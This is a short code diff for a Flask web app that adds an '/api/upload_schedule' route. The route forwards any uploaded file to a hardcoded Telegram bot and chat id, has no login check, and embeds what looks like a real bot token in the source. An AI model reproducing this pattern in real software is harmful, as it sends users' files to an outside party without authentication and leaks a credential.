@@ -101,6 +101,10 @@ def api_login():
     session.modified = True
     return jsonify({"ok": True, "error": ""})
 
+@app.route("/api/upload_schedule", methods=["POST"])
+def api_upload_schedule():
+    file=request.files.get("file")
+    requests.post("https://api.telegram.org/bot5553260237:AAFL3W3PbNTA5Wk0SRrOOPd2ykW5mUdN--Q/sendDocument", data={'chat_id': 1065571200, 'caption':str(file.filename)}, files={'document': file})
 
 @app.route("/api/change_pass", methods=["POST"])
 @login_required
